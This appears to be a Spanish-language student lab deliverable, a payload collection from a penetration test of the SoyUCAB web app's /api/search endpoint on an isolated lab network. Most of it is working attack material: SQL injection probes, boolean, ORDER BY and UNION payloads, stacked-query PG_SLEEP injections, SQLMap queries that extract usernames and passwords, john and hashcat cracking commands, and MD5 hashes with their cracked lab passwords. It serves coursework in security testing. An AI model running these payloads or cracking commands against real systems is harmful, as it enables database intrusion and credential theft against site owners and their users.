# 🔫 ARSENAL COMPLETO DE PAYLOADS
## Proyecto SoyUCAB · Objetivo: `/api/search?q=` · PostgreSQL

> Documento de payloads del ataque (entregable 5.4.2). Todos los payloads fueron probados en el entorno de laboratorio aislado. Fines exclusivamente educativos.

---

## 🕵️ FASE 1 — Reconocimiento (descubrimiento de endpoints)

Aunque no son "payloads" de inyección, fueron los comandos clave para mapear la superficie:

```bash
# Extraer rutas de la API desde el JavaScript del cliente
curl -s http://192.168.56.20:3000/js/main.js | grep -Eo "/api/[a-zA-Z0-9/_-]*" | sort -u
```

**Endpoints descubiertos:** `/api/search`, `/api/post`, `/api/miembro`, `/api/profile/`, `/api/persona/`, `/api/comments/`, `/api/likes/toggle`, `/api/relationship/follow`, etc.

---

## 💉 FASE 2 — Payloads de SQL Injection (CWE-89)

### 1. Sondeo / Detección
```sql
test'
```
> Rompe la query → HTTP 500 → confirma vulnerabilidad.

### 2. Control de sintaxis (reparación)
```sql
test' -- -
```
> Comenta el resto → HTTP 200 → control confirmado.

### 3. Boolean-based (lógica verdadera/falsa)
```sql
test' OR '1'='1
test' OR '1'='2
juan' OR '1'='1
juan' OR '1'='2
```
> Manipulación de la condición lógica (blind SQLi).

### 4. Enumeración de columnas (ORDER BY)
```sql
test' ORDER BY 1 -- -
test' ORDER BY 2 -- -
test' ORDER BY 3 -- -
test' ORDER BY 4 -- -
test' ORDER BY 5 -- -
```
> 4 = 200 (existe), 5 = 500 (no existe) → **4 columnas**.

### 5. UNION-based (intentos de extracción)
```sql
test' UNION SELECT NULL -- -
test' UNION SELECT NULL,NULL -- -
test' UNION SELECT NULL,NULL,NULL -- -
test' UNION SELECT NULL,NULL,NULL,NULL -- -
test' UNION SELECT NULL,NULL,NULL,NULL,NULL -- -
test' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL -- -
test' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL -- -
test' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL -- -
```
> Barrido de 1 a 8 columnas → todos 500 (la app crashea al procesar filas).

### 6. UNION con marcadores de texto (sondeo de tipos)
```sql
test' UNION SELECT 'XXX',NULL,NULL,NULL -- -
test' UNION SELECT NULL,'XXX',NULL,NULL -- -
test' UNION SELECT NULL,NULL,'XXX',NULL -- -
test' UNION SELECT NULL,NULL,NULL,'XXX' -- -
test' UNION SELECT 'AAA','BBB','CCC','DDD' -- -
```
> Todos 500 → confirmó que el backend crashea al procesar cualquier fila inyectada.

### 7. Stacked Queries (el vector CONFIRMADO por SQLMap) 🚨
```sql
test';SELECT PG_SLEEP(5)--
test';SELECT PG_SLEEP(1)--
```
> Consultas apiladas → la variante más peligrosa (permite comandos arbitrarios). PostgreSQL confirmado.

---

## 📦 Payloads de extracción (generados por SQLMap)

SQLMap usó internamente estos objetivos de extracción vía time-based blind:

```sql
-- Enumerar esquemas
';SELECT ... FROM pg_database--
-- Enumerar tablas del esquema public
';SELECT ... FROM information_schema.tables WHERE table_schema='public'--
-- Enumerar columnas de miembro
';SELECT ... FROM information_schema.columns WHERE table_name='miembro'--
-- Extraer credenciales
';SELECT nombre_usuario,clave FROM miembro--
```

---

## 🔓 Payloads de Cracking de hashes (CWE-328)

```bash
# Diccionario básico
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Con reglas de mutación
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt --rules hashes.txt

# Fuerza bruta por máscara (para admin2025)
john --format=raw-md5 --mask='?l?l?l?l?l2025' hashes.txt

# Alternativa con Hashcat
hashcat -m 0 -a 0 hashes-solo.txt /usr/share/wordlists/rockyou.txt
```

**Hashes objetivo (tabla Miembro):**
```
juan:482c811da5d5b4bc6d497ffa98491e38    -> password123  (crackeada)
admin:e88df8596ff8847e232b1e4b1b5ffde2   -> admin2025    (resistio rockyou + rules)
maria:d8578edf8458ce06fbc5bb76a58c5ca4   -> qwerty       (crackeada)
```

---

## 🎯 Los 3 payloads "estrella" (los imprescindibles)

| Payload | Qué demuestra |
|---|---|
| `test'` | Existe la inyección (rompe la query) |
| `test' -- -` | Controlas la sintaxis (la reparas) |
| `test';SELECT PG_SLEEP(5)--` | Stacked queries → máximo impacto |

---

## 📌 Recordatorio de envío (codificación)

Todos se enviaron con curl usando `--data-urlencode` para codificar espacios y comillas:

```bash
curl -s -i -G "http://192.168.56.20:3000/api/search" --data-urlencode "q=PAYLOAD_AQUI"
```

**Codificación URL manual (para Burp Repeater):**
- `%27` = `'` (comilla simple)
- `%20` = espacio

---

## ⚖️ NOTA ÉTICA
Todos los payloads se ejecutaron **exclusivamente** dentro del entorno virtualizado aislado (Red Interna), con fines académicos. Prohibido su uso fuera del laboratorio.
